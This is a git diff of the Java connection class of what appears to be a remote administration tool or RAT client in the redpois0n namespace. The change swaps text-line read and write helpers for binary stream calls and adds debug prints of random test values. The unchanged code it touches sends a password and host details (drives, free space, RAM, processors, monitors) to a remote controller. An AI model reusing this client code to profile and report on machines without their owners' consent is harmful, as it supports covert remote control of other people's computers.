@@ -15,6 +15,7 @@ import java.lang.management.ManagementFactory;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.util.Locale;
+import java.util.Random;
 
 import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.common.Version;
@@ -64,6 +65,24 @@ public class Connection implements Runnable {
 			
 			Main.encryption = inputStream.read() == 1;
 			
+			System.out.println("Read int: " + readInt());
+			System.out.println("Read long: " + readLong());
+			System.out.println("Read short: " + readShort());
+			
+			int i = (new Random()).nextInt();
+			long l = (new Random()).nextInt();
+			short s = (short) (new Random()).nextInt(1000);
+
+			
+			System.out.println("Write int: " + i);
+			System.out.println("Write long: " + l);
+			System.out.println("Write short: " + s);
+			
+			writeInt(i);
+			writeLong(l);
+			writeShort(s);
+
+			
 			addToSendQueue(new PacketBuilder(Header.INIT_PASSWORD, Main.getPass()));		
 
 			initialize();
@@ -95,7 +114,7 @@ public class Connection implements Runnable {
 		}
 	}
 
-	public static void initialize() {
+	public static void initialize() throws Exception {
 		addToSendQueue(new PacketBuilder(Header.INIT_DATE, Main.date));
 
 		addToSendQueue(new PacketBuilder(Header.INIT_VERSION, Version.getVersion()));
@@ -136,7 +155,7 @@ public class Connection implements Runnable {
 		PacketBuilder drives = new PacketBuilder(Header.INIT_DRIVES);
 		File[] roots = File.listRoots();
 		drives.add(roots.length);
-		for (File root : roots) {
+		for (File root : roots) {		
 			drives.add(root.getAbsolutePath());
 			drives.add(root.getTotalSpace() / 1024L / 1024L / 1024L);
 			drives.add(root.getFreeSpace() / 1024L / 1024L / 1024L);
@@ -146,7 +165,7 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new PacketBuilder(Header.INIT_RAM, (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
 
-		addToSendQueue(new PacketBuilder(Header.INIT_AVAILABLE_PROCESSORS, Runtime.getRuntime().availableProcessors() + ""));
+		addToSendQueue(new PacketBuilder(Header.INIT_AVAILABLE_PROCESSORS, Runtime.getRuntime().availableProcessors()));
 
 		PacketBuilder monitor = new PacketBuilder(Header.INIT_MONITORS);
 		GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
@@ -224,92 +243,44 @@ public class Connection implements Runnable {
 		}
 	}
 	
-	public static void writeShort(int i) throws Exception {
-		if (true) {
-			writeLine(i);
-		} else {
-			dos.writeShort(i);
-
-		}
+	public static void writeShort(short i) throws Exception {
+		dos.writeShort(i);
 	}
-	
+
 	public static short readShort() throws Exception {
-		if (true) {
-			return Short.parseShort(readLine());
-		} else {
-			return dis.readShort();
-
-		}
+		return dis.readShort();
 	}
-	
+
 	public static byte readByte() throws Exception {
-		if (true) {
-			return Byte.parseByte(readLine());
-		} else {
-			return dis.readByte();
-
-		}
+		return dis.readByte();
 	}
-	
+
 	public static void writeByte(int b) throws Exception {
-		if (true) {
-			writeLine(b);
-		} else {
-			dos.writeByte(b);
-
-		}
+		dos.writeByte(b);
 	}
-	
+
 	public static boolean readBoolean() throws Exception {
-		if (true) {
-			return readLine().equalsIgnoreCase("true");
-		} else {
-			return dis.readBoolean();
-
-		}
+		return dis.readBoolean();
 	}
-	
+
 	public static void writeBoolean(boolean b) throws Exception {
-		if (true) {
-			writeLine(b);
-		} else {
-			dos.writeBoolean(b);
-
-		}
+		dos.writeBoolean(b);
 	}
-	
+
 	public static int readInt() throws Exception {
-		if (true) {
-			return Integer.parseInt(readLine());
-		} else {
-			return dis.readInt();		
-
-		}
+		return dis.readInt();
 	}
-	
+
 	public static void writeInt(int i) throws Exception {
-		if (true) {
-			writeLine(i);
-		} else {
-			dos.writeInt(i);
+		dos.writeInt(i);
+	}
 
-		}
+	public static long readLong() throws Exception {
+		return dis.readLong();
 	}
-	
-	public static long readLong() throws Exception {	
-		if (true) {
-			return Long.parseLong(readLine());
-		} else {
-			return dis.readLong();
-		}
-	}
-	
+
 	public static void writeLong(long l) throws Exception {
-		if (true) {
-			writeLine(l);
-		} else {
-			dos.writeLong(l);
-		}
+		dos.writeLong(l);
 	}
 
 	public static void writeLine(Object obj) throws Exception {
